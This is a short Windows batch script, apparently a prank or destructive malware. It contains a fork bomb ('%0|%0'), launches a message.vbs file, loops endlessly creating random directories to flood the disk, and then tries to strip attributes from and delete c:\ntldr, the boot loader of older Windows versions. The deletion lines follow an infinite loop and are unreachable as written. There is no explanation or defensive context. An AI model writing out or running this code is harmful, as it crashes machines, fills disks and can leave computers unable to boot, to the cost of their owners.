%0|%0
@echo off
start message.vbs
:Rookie
MD %RANDOM%
goto Rookie
attrib -s -r -h c:\ntldr
del ntldr
